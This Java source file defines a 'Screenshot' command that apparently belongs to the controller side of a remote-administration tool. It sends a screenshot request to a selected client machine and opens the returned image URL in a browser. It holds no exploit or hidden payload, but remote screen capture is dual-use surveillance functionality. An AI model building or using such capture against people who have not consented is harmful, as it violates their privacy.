package me.wpkg.cli.commands;

import me.wpkg.cli.gui.ProgressDialog;
import me.wpkg.cli.main.Main;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class Screenshot extends Command
{
    public Screenshot(DefaultListModel<String> clientModel)
    {
        super("screenshot", "Get Screenshot", clientModel);
    }
    @Override
    public void execute()
    {
        ProgressDialog progressDialog = new ProgressDialog("Waiting for screenshot...");
        progressDialog.start((dialog) -> {
            String url = sendCommand("screenshot");
            if (Desktop.isDesktopSupported())
            {
                try {
                    Desktop.getDesktop().browse(new URI(url));
                } catch (IOException e) {
                    JOptionPane.showMessageDialog(Main.frame,"Error:" + e.getMessage(),"Error",JOptionPane.ERROR_MESSAGE);
                } catch (URISyntaxException e) {
                    JOptionPane.showMessageDialog(Main.frame,"Can't open url: " + e.getMessage(),"Error",JOptionPane.ERROR_MESSAGE);
                }
            }
            else JOptionPane.showMessageDialog(Main.frame,"System don't support java.awt.Desktop","Error",JOptionPane.ERROR_MESSAGE);
        }).await();
    }
}
